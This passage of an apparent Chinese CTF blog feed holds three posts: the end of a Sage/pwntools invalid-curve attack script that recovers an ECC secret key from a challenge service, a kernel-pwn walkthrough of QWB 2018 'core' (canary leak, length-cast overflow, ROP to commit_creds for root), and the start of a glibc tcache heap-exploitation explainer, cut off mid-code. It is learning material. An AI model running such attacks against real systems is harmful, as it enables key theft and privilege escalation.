class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"># sage </span><br><span class="line">from pwn import *</span><br><span class="line">#context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">from hashlib import sha256</span><br><span class="line">import string</span><br><span class="line">from pwnlib.util.iters import mbruteforce</span><br><span class="line">import itertools</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import *</span><br><span class="line">from functools import reduce</span><br><span class="line">table &#x3D; string.ascii_letters+string.digits</span><br><span class="line">p &#x3D; 0xc483230557557e3d94b7407f3355b8a5b26bda29119babcb8d72b5a19e10e113</span><br><span class="line">a &#x3D; 0xb5ecbb93d4e49fe3c93ad770343ec5ab70131151151fcc830f6c658223c92e1d</span><br><span class="line">B &#x3D; [(100,3733,46559),(102,13457),(103,1499,37057),(105,883,1223,2459),(106,9433),(110,8017 ),(114,1753),(119,163),(120, 479 , 1033,47623 ),(123,4177,17623 ),(124,193 ,2467 ),(125,5147),(130,3499),(133,181,701,36571 ),(135,19211 ,34273), (136,11657),(137,857),(138,167),(140,9629,26701),(141,389),(143, 50363),(145,109 , 181 ,24121 ,223747),(146,3079,243871),(147,3643,129629)]</span><br><span class="line">s &#x3D; 0</span><br><span class="line">def passpow():</span><br><span class="line">    io.recvuntil(b&quot;XXXX+&quot;)</span><br><span class="line">    suffix &#x3D; io.recv(16).decode(&quot;utf8&quot;)</span><br><span class="line">    print(suffix)</span><br><span class="line">    io.recvuntil(b&quot; &#x3D;&#x3D; &quot;)</span><br><span class="line">    cipher &#x3D; io.recvline().strip().decode(&quot;utf8&quot;)</span><br><span class="line">    proof &#x3D; mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() &#x3D;&#x3D;</span><br><span class="line">                        cipher, table, length&#x3D;4, method&#x3D;&#39;fixed&#39;)</span><br><span class="line">    io.recvuntil(&#39;Give me XXXX &gt; &#39;)</span><br><span class="line">    io.sendline(proof) </span><br><span class="line">io &#x3D; remote(&quot;0.0.0.0&quot;,10003)</span><br><span class="line">#io &#x3D; remote(&quot;172.51.227.129&quot;,10002)</span><br><span class="line">#passpow()</span><br><span class="line">for i in B:</span><br><span class="line">s+&#x3D;len(i)</span><br><span class="line">print(s-len(B))</span><br><span class="line">def sendpoint(a,b):</span><br><span class="line">    io.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">    io.sendline(&quot;1&quot;)</span><br><span class="line">    io.recvuntil(&quot;X &gt;&quot;)</span><br><span class="line">    io.sendline(a)</span><br><span class="line">    io.recvuntil(&quot;Y &gt;&quot;)</span><br><span class="line">    io.sendline(b)</span><br><span class="line">    io.recvuntil(&quot;result:&quot;)</span><br><span class="line">    return io.recvline()</span><br><span class="line">primes &#x3D; []</span><br><span class="line">K &#x3D; []</span><br><span class="line">s &#x3D; 1</span><br><span class="line">for i in B:</span><br><span class="line">    b &#x3D; i[0]</span><br><span class="line">    E &#x3D; EllipticCurve(GF(p),[a,b])</span><br><span class="line">    order &#x3D; E.order()</span><br><span class="line">    X &#x3D; E.random_point()</span><br><span class="line">    inf &#x3D; X-X</span><br><span class="line">    prime_list &#x3D; i[1:]</span><br><span class="line">    for prime in prime_list:</span><br><span class="line">        while True:</span><br><span class="line">            if(order%prime):</span><br><span class="line">                print(f&quot;ERROR in &#123;i,prime&#125;&quot;)</span><br><span class="line">                print(f&quot;order &#x3D;&#123;order&#125;,prime &#x3D; &#123;prime&#125;,order % prime &#x3D; &#123;order%prime&#125;&quot;)</span><br><span class="line">            G &#x3D; X*int(order&#x2F;&#x2F;prime)</span><br><span class="line">            if(G&#x3D;&#x3D;inf):</span><br><span class="line">                X &#x3D; E.random_point()</span><br><span class="line">            else:</span><br><span class="line">                break</span><br><span class="line">        ans &#x3D; eval(sendpoint(str(G[0]),str(G[1])))</span><br><span class="line">        Q &#x3D; E(ans)</span><br><span class="line">        #print(ans)</span><br><span class="line">        for k in range(prime):</span><br><span class="line">            if(k*G&#x3D;&#x3D;Q):</span><br><span class="line">                primes.append(prime)</span><br><span class="line">                print(f&#39;k &#x3D; &#123;k&#125;&#39;)</span><br><span class="line">                K.append(k)</span><br><span class="line">                break</span><br><span class="line">        print(f&#39;this times is &#123;prime&#125;&#39;)</span><br><span class="line">        #k &#x3D; discrete_log(Q,G,operation &#x3D; &#39;+&#39;) #感觉要慢点,不如爆破</span><br><span class="line"></span><br><span class="line">        #if(k&lt;prime):</span><br><span class="line">        #    print(&quot;yep&quot;)</span><br><span class="line">        #primes.append(prime)</span><br><span class="line">        #K.append(k)</span><br><span class="line">print(primes)</span><br><span class="line">print(K)</span><br><span class="line">ans &#x3D; crt(K,primes)</span><br><span class="line">print(ans)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;学不动了，把之前做的记录一下&lt;/p&gt;
&lt;h1 id=&quot;pwn&quot;&gt;&lt;a href=&quot;#pwn&quot; class=&quot;headerlink&quot; title=&quot;pwn&quot;&gt;&lt;/a&gt;pwn&lt;/h1&gt;&lt;p&gt;比赛过程中做出俩&lt;code&gt;pwn&lt;/code&gt;，还有个复现了一下感觉好像也不是很难。剩</summary>
      
    
    
    
    
    <category term="pwn" scheme="http://phot0n.com/tags/pwn/"/>
    
    <category term="crypto" scheme="http://phot0n.com/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>KernelPwn入门</title>
    <link href="http://phot0n.com/2022/11/17/KernelPwn%E5%85%A5%E9%97%A8/"/>
    <id>http://phot0n.com/2022/11/17/KernelPwn%E5%85%A5%E9%97%A8/</id>
    <published>2022-11-17T05:04:12.000Z</published>
    <updated>2022-11-18T09:20:31.576Z</updated>
    
    <content type="html"><![CDATA[<p>这里记录一下做得第一个kernel pwn题，非常经典的强网杯2018的core，网上很多相关的wp。由于笔者的知识比较匮乏，所以有些可能会写的比较啰嗦(应该比较适合像我一样的新生)</p><p>最近在学kernel相关知识(在啃<code>a guide to kernel exploitation</code>,读英文有点难受)，还打算学一下沙盒原理之类的(比如CSAW那个shellcode题就打算稍微总结一下)，不过时间有点紧，自己也比较懒…能学一点是一点吧</p><h2 id="强网杯2018-core"><a href="#强网杯2018-core" class="headerlink" title="强网杯2018 core"></a>强网杯2018 core</h2><p>这是一道kernel ROP题,和我们在用户态下的ROP很像.kernel pwn的目的是提权,即让我们从一个普通用户晋升为一个<code>root</code>.而用户态和kernel下的ROP主要的区别是我们在用户态下执行的是<code>system(&quot;/bin/sh&quot;)</code>,而在内核态下执行的是<code>commit_creds(prepare_kernel_cred(NULL))</code> .我们执行这个命令来改变当前进程的<code>cred</code>结构体.这个结构体是内核中用以控制一个进程的权限的结构体.</p><p>而执行的这两个函数分别为<code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code>以及<code>int commit_creds(struct cred *new)</code> </p><p>前者的作用是复制一个进程的<code>cred</code>结构体,然后返回一个新的<code>cred</code>结构体,而后者的作用是将一个新的<code>cred</code>结构体置于一个新进程.</p><p>详细的函数定义我们可以查阅linux的源码,具体路径在kernel/cred.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct cred *<span class="title">prepare_creds</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> = <span class="title">current</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">validate_process_creds();</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">kdebug(<span class="string">&quot;prepare_creds() alloc %p&quot;</span>, <span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line">old = task-&gt;cred;</span><br><span class="line"><span class="built_in">memcpy</span>(<span class="keyword">new</span>, old, <span class="keyword">sizeof</span>(struct cred));</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span>-&gt;non_rcu = <span class="number">0</span>;</span><br><span class="line">atomic_set(&amp;<span class="keyword">new</span>-&gt;usage, <span class="number">1</span>);</span><br><span class="line">set_cred_subscribers(<span class="keyword">new</span>, <span class="number">0</span>);</span><br><span class="line">get_group_info(<span class="keyword">new</span>-&gt;group_info);</span><br><span class="line">get_uid(<span class="keyword">new</span>-&gt;user);</span><br><span class="line">get_user_ns(<span class="keyword">new</span>-&gt;user_ns);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;session_keyring);</span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;process_keyring);</span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;thread_keyring);</span><br><span class="line">key_get(<span class="keyword">new</span>-&gt;request_key_auth);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">new</span>-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (security_prepare_creds(<span class="keyword">new</span>, old, GFP_KERNEL_ACCOUNT) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line">validate_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span>;</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">abort_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个是我在5.11找的的源码,但是似乎我找的有部分源码长这样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct cred *<span class="title">prepare_kernel_cred</span><span class="params">(struct task_struct *daemon)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    kdebug(<span class="string">&quot;prepare_kernel_cred() alloc %p&quot;</span>, <span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (daemon)</span><br><span class="line">        old = get_task_cred(daemon);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        old = get_cred(&amp;init_cred);</span><br></pre></td></tr></table></figure><p>好像主要区别是前者只能复制当前进程的<code>cred</code>?但是后者能复制<code>init_cred</code>也就是<code>init</code>进程的<code>cred</code>,可以直接获取一个<code>root</code>权限的<code>cred</code>结构体</p><p>(这里不是很懂,如果以后搞明白了再进行修改.貌似是高版本做了点修改使得利用变困难了)</p><p>总的来说,我们的目标是调用<code>commit_creds(prepare_kernel_cred(NULL))</code> </p><p>但是我们还有其他需要注意的地方.当exp进入到内核态完成提权的时候,最终还是要回到用户态执行<code>system(&quot;/bin/sh&quot;)</code>命令然后开启一个具有<code>root</code>权限的<code>shell</code>.所以进入内核态之前需要进行<strong>状态保存</strong>,也就是模拟一下用户态进入内核态的准备,包括保存各种寄存器之类的</p><p>在返回用户态的时候,我们需要<code>swapgs</code>指令来恢复用户态的GS寄存器,还需要<code>sysretq</code>或者<code>iretq</code>来恢复到用户空间.</p><h3 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h3><p>具体的打包解包问题就不在这整理了,很多blog上面都有介绍,这里主要记录一下原理和利用相关</p><p>通过查看<code>start.sh</code>,我们可以看到开启的保护(这里开启了<code>kaslr</code>)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure><p>这里需要注意最好把内存改大一点,不然可能运行的时候会报错(我改成了512M)</p><p>把文件系统解包之后可以看到<code>init</code>文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">mount -t proc proc &#x2F;proc</span><br><span class="line">mount -t sysfs sysfs &#x2F;sys</span><br><span class="line">mount -t devtmpfs none &#x2F;dev</span><br><span class="line">&#x2F;sbin&#x2F;mdev -s</span><br><span class="line">mkdir -p &#x2F;dev&#x2F;pts</span><br><span class="line">mount -vt devpts -o gid&#x3D;4,mode&#x3D;620 none &#x2F;dev&#x2F;pts</span><br><span class="line">chmod 666 &#x2F;dev&#x2F;ptmx</span><br><span class="line">cat &#x2F;proc&#x2F;kallsyms &gt; &#x2F;tmp&#x2F;kallsyms</span><br><span class="line">echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;kptr_restrict</span><br><span class="line">echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line">insmod &#x2F;core.ko</span><br><span class="line"></span><br><span class="line">poweroff -d 120 -f &amp;</span><br><span class="line">setsid &#x2F;bin&#x2F;cttyhack setuidgid 1000 &#x2F;bin&#x2F;sh</span><br><span class="line">echo &#39;sh end!\n&#39;</span><br><span class="line">umount &#x2F;proc</span><br><span class="line">umount &#x2F;sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure><p><code>/proc/sys/kernel/kptr_restrict</code>决定了我们能否通过<code>/proc/kallsyms</code>来查看函数地址,<code>init</code>将其设置为1,所以无法查看,但是在设置之前被复制了一份到<code>/tmp/kallsyms</code>中</p><p><code>/proc/sys/kernel/dmesg_restrict</code>决定了我们能否访问内核打印的消息,设置为1时将无法访问</p><p>我们先分析一下这个<code>core.ko</code></p><p><img src="https://s2.loli.net/2022/11/18/3Ox4JKLNVMpBT6H.png" alt=""></p><p>开启了<code>canary</code></p><p><code>insmod</code>将<code>core.ko</code>模块载入,这就是有漏洞的模块,我们将其拖入IDA进行分析</p><p><img src="https://s2.loli.net/2022/11/18/9UNj8znsOKV54g2.png" alt=""></p><p><code>proc_create</code>创建了一个<code>proc</code>虚拟文件,引用出通过读写这个文件就可以实现与内核的交互</p><p>而<code>core_fops</code>是一个<code>file_operations</code>结构体,其内容大多是函数指针.那么我们可以通过修改其中的函数指针来达到重写函数的目的.</p><p>通过查看结构体可以发现这里其实重写了三个,分别是<code>core_write</code>,<code>core_ioctl</code>以及<code>core_release</code></p><p><code>core_toctl</code>具体由三个功能,分别是<code>core_read</code>,设置<code>off</code>,以及<code>core_copy_func</code></p><p><img src="https://s2.loli.net/2022/11/18/34aMmqAw8BExFb2.png" alt=""></p><p>我们先看看这个<code>core_read</code></p><p><img src="https://s2.loli.net/2022/11/18/Fln7UvmfNQXK4dO.png" alt=""></p><p>这里将内核栈上的64个字节内容复制到了用户区(<code>copy_to_user</code>),由于我们可以设置<code>off</code>,所以我们可以把内核栈的<code>canary</code>给复制到用户态的栈上然后泄露出来</p><p>再看看这个<code>core_copy_func</code></p><p><img src="https://s2.loli.net/2022/11/18/df4uUOhkxINVJC6.png" alt=""></p><p>这里我们可以将bss段(也就是这个<code>name</code>)上的内容复制<code>a1</code>个字节到内核栈上,注意到这里虽然检测设置了<code>a1&lt;=63</code>,但是最后调用的时候是将<code>__int64</code>类型的<code>a1</code>强制转换成了<code>unsigned _int16</code>,所以如果我们设置<code>a1</code>为负数的话强制转化之后它会变成一个很大的数,所以存在栈溢出的漏洞</p><p>同时,<code>core_write</code>函数可以实现对这个bss段内容的设置</p><p><img src="https://s2.loli.net/2022/11/18/6rIv5JNGgdMwZnC.png" alt=""></p><p>所以我们的思路就很明显了</p><ul><li>通过<code>core_read</code>泄露内核栈上的<code>canary</code></li><li>通过<code>core_write</code>对<code>bss</code>段填充好ROP链</li><li>执行<code>core_copy_func</code>函数,进行栈溢出执行ROP链</li><li>返回用户态,新起一个<code>root shell</code></li></ul><p>还有就是关于函数地址的问题,这个类似用户态下的<code>libc</code>基址的泄露,由于符号表被复制了一份到<code>/tmp/kallsyms</code>中,所以我们可以从中获取地址然后计算基址从而得到运行时的地址</p><p>还有就是关于<code>gdb</code>与<code>qemu</code>调试的相关内容.首先是如何用<code>gdb</code>进行调试,当运行脚本<code>/start.sh</code>的时候已经通过<code>-s</code>开启了调试端口,默认的为<code>1234</code>,所以我们另起一个终端,运行<code>gdb vmlinux</code>,然后直接通过<code>target remote localhost:1234</code>进行连接</p><p><img src="https://s2.loli.net/2022/11/18/lRJYAwmPQogDn5N.png" alt=""></p><p>还有就是vmlinux里面有<code>kernel</code>的符号表,但是没有驱动<code>core.ko</code>的符号表,这个需要我们自己添加,主要的命令是<code>add-symbol-file</code>,就把<code>core.ko</code>载入即可.再此之前我们需要获取<code>core.ko</code>的<code>text</code>段地址,通过<code>/sys/modules/core/section/.text</code>来查看,但是查看它需要root权限,所以我们修改一下<code>init</code>重新打包就好了</p><p><img src="https://s2.loli.net/2022/11/18/YmGECX3eQuUlb4S.png" alt=""></p><p>然后就就可以开始调试了,调试的区别好像和用户态下的区别不是很大,多动手自己尝试几遍就行了(<code>make your hand dirty XD</code>)</p><p>exp就不贴了，第一次接触都是调试的别的大佬的exp(x)，也就运行了一下然后下断点单步调试看看思路之类的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里记录一下做得第一个kernel pwn题，非常经典的强网杯2018的core，网上很多相关的wp。由于笔者的知识比较匮乏，所以有些可能会写的比较啰嗦(应该比较适合像我一样的新生)&lt;/p&gt;
&lt;p&gt;最近在学kernel相关知识(在啃&lt;code&gt;a guide to kern</summary>
      
    
    
    
    
    <category term="kernel" scheme="http://phot0n.com/tags/kernel/"/>
    
    <category term="pwn" scheme="http://phot0n.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>fastbin reverse into tcache</title>
    <link href="http://phot0n.com/2022/11/14/fastbin-reverse-into-tcache/"/>
    <id>http://phot0n.com/2022/11/14/fastbin-reverse-into-tcache/</id>
    <published>2022-11-14T06:36:55.000Z</published>
    <updated>2022-11-14T09:53:02.068Z</updated>
    
    <content type="html"><![CDATA[<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>上次祥云杯中遇到了<code>fastbin reverse into tcache</code>的利用手法，这里简单分析一下它的原理。需要注意的是，在glibc2.27以下和以上的利用方式有点区别。高版本的<code>glibc</code>在利用的时候必须保证相应大小的<code>tcache bin</code>为空(也就是<code>count</code>为0)，而低版本(<code>glibc2.27</code>及以下，当然需要有<code>tcachebin</code>)只要保证相应<code>entry</code>指针为<code>NULL</code>即可，不用保证<code>count</code>为0</p><p>先首先说一下利用条件以及达到效果。</p><ul><li>利用条件:存在UAF,可以修改<code>fd</code></li><li>达到效果:在任意地址写上一个堆地址,以及申请相应<code>chunk</code>，进行任意地址写</li></ul><p>主要的源码如下所示，我们先看<code>glibc2.27</code>的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = _int_malloc (&amp;main_arena, bytes);</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当调用<code>malloc</code>的时候，会对<code>__libc_malloc</code>进行调用。如果<code>tcache bin</code>中有相应大小的<code>chunk</code>,就直接利用<code>tcache_get(tc_idx)</code>取出即可。也就是对应如下代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">    <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">    &amp;&amp; tcache</span><br><span class="line">    &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>多说一句，这里的判定条件是<code>tc_idx &lt; mp_.tcache_bins &amp;&amp;tcache &amp;&amp;tcache-&gt;entries[tc_idx] != NULL</code> 。并没有涉及到<code>tcache-&gt;count[tc_idx]</code>的判断。也就是说我们可以让<code>tcache-&gt;entries[tc_idx] == NULL</code> ,即使<code>tcache-&gt;count[tc_idx] !=0</code>，也能绕过从<code>tcache bin</code>中取<code>chunk</code>的操作。也就是让其<code>double free</code>即可。需要注意的是在高版本的<code>libc</code>中增加了对<code>double free</code> 的检测。具体的做法是加入了<code>key</code>字段以及遍历看<code>fd</code>。这个以后再总结一下。</p><p>我们回到刚刚的分析，如果这个判定条件不成立的话，后面我们会调用<code>_int_malloc</code> </p><p>这里涉及的代码如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 